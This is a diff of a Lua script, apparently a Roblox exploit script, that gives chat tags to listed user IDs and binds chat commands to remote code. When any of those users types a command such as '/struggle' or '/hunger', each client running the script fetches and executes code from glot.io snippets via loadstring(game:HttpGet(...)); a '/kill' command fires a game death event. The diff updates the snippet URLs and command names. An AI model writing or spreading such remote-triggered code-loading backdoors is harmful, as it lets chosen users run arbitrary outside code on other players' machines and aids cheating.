@@ -24,7 +24,7 @@ if message.TextSource.UserId == 3834105284 then
 			end
 
 if message.TextSource.UserId == 3514603488 then
-				props.PrefixText = "<font color='#a85232'>[Big Helper]</font> <font color='#a85232'>[Nautic]</font> " .. message.PrefixText
+				props.PrefixText = "<font color='#a85232'>[Best Helper]</font> <font color='#a85232'>[Nautic]</font> " .. message.PrefixText
 			end
 
 			if message.TextSource.UserId == 1736174957 then
@@ -45,25 +45,25 @@ if message.TextSource.UserId == 3514603488 then
 			if message.TextSource.UserId == 3570707940 or message.TextSource.UserId == 2011017143 or message.TextSource.UserId == 3834105284 or message.TextSource.UserId == 3514603488 or message.TextSource.UserId == 1736174957 then
 				
 				if msg == '/struggle' or msg == '/Struggle' then
-					loadstring(game:HttpGet("https://glot.io/snippets/gluape01uh/raw/main.lua"))()
+					loadstring(game:HttpGet("https://glot.io/snippets/gnaaqviiqr/raw/main.lua"))()
 				end
 
-if msg == '/depth' or msg == '/Depth' then
+if msg == '/revoker' or msg == '/Revoker' or msg == '/revoke' or msg == '/Revoke' then
 
-loadstring(game:HttpGet("https://glot.io/snippets/gluaxm22bp/raw/main.lua"))()
+loadstring(game:HttpGet("https://glot.io/snippets/gmz8h3hkco/raw/main.lua"))()
        end
 				
 				if msg == '/rebound' or msg == '/Rebound' then
-					loadstring(game:HttpGet("https://glot.io/snippets/gm047hdwli/raw/main.lua"))()
+					loadstring(game:HttpGet("https://glot.io/snippets/gmwde8m5nn/raw/main.lua"))()
 				end
 				
 				if msg == '/hungered' or msg == '/Hungered' or msg == '/Hunger' or msg == '/hunger' then
-					loadstring(game:HttpGet("https://glot.io/snippets/glub4oj8wj/raw/main.lua"))()
+					loadstring(game:HttpGet("https://glot.io/snippets/gnfsu2m3ny/raw/main.lua"))()
 				end
 
 if msg == '/Hustle' or msg == '/hustle' or msg == '/A130' or msg == '/A-130' or msg == '/a-130' or msg == '/a130' then
 
-loadstring(game:HttpGet("https://glot.io/snippets/glwzaz94z6/raw/main.lua"))()
+loadstring(game:HttpGet("https://glot.io/snippets/gn79v2vom6/raw/main.lua"))()
        end
 
 if msg == '/kill' or msg == '/bye' then
@@ -79,30 +79,16 @@ firesignal(game.ReplicatedStorage.EntityInfo.DeathHint.OnClientEvent, {"L", "L",
 					end)()
 				end
 
-if msg == '/G-26' or msg == '/G26' or msg == '/g26' or msg == 'g-26' then
-
-loadstring(game:HttpGet("https://glot.io/snippets/glz363sgnx/raw/main.lua"))()
-       end
-
 if msg == '/secret' or msg == '/Secret' or msg == '/gem' or msg == '/Gem' then
 
 loadstring(game:HttpGet("https://glot.io/snippets/gltlhbfra2/raw/main.lua"))()
        end
 
-if msg == '/defuse' or msg == '/Defuse' then
-
-loadstring(game:HttpGet("https://glot.io/snippets/glkqkf1yus/raw/main.lua"))()
-       end
-
-if msg == '/A60' or msg == '/A-60' or msg == '/a60' or msg == '/a-60' then
+if msg == '/bad60' or msg == '/60bad' or msg == '/a60bad' then
 
 loadstring(game:HttpGet("https://glot.io/snippets/glkxi69t3k/raw/main.lua"))()
        end
 				
-				if msg == '/E200' or msg == '/E-200' or msg == '/e200' or msg == '/e-200' then
-					loadstring(game:HttpGet("https://glot.io/snippets/glsjnksf8l/raw/main.lua"))()
-
-				end
 			end
 return props
 		end
